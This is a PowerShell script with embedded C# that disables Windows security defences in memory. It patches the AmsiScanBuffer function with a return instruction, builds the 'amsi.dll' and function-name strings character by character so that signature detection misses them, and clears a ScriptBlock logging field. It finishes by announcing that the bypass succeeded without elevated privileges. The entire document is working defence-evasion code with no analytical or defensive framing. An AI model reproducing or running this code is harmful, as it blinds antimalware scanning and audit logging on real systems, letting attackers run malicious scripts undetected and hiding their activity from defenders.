$code = @"
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace InMemoryBypass
{
    public class AMSIAndScriptBlock
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void BypassAMSI()
        {
            string amsi = new string(new char[] { 'a', 'm', 's', 'i', '.', 'd', 'l', 'l' });
            string scanBuffer = new string(new char[] { 'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r' });

            IntPtr hModule = LoadLibrary(amsi);
            IntPtr procAddress = GetProcAddress(hModule, scanBuffer);

            if (procAddress == IntPtr.Zero) return;

            uint oldProtect;
            VirtualProtect(procAddress, (UIntPtr)0x10, 0x40, out oldProtect); // PAGE_EXECUTE_READWRITE

            byte[] patch = new byte[] { 0xC3 }; // RET
            Marshal.Copy(patch, 0, procAddress, patch.Length);
        }

        public static void DisableScriptBlockLogging()
        {
            var asm = Assembly.Load("System.Management.Automation");
            var scriptBlockType = asm.GetType("System.Management.Automation.ScriptBlock");
            var field = scriptBlockType.GetField("s_PolicyStack", BindingFlags.Static | BindingFlags.NonPublic);

            if (field != null)
            {
                field.SetValue(null, null);
            }
        }
    }
}
"@

Add-Type -TypeDefinition $code -Language CSharp

[InMemoryBypass.AMSIAndScriptBlock]::BypassAMSI()

[InMemoryBypass.AMSIAndScriptBlock]::DisableScriptBlockLogging()

Write-Host "AMSI and ScriptBlockLogging bypassed in-memory without elevated privileges."
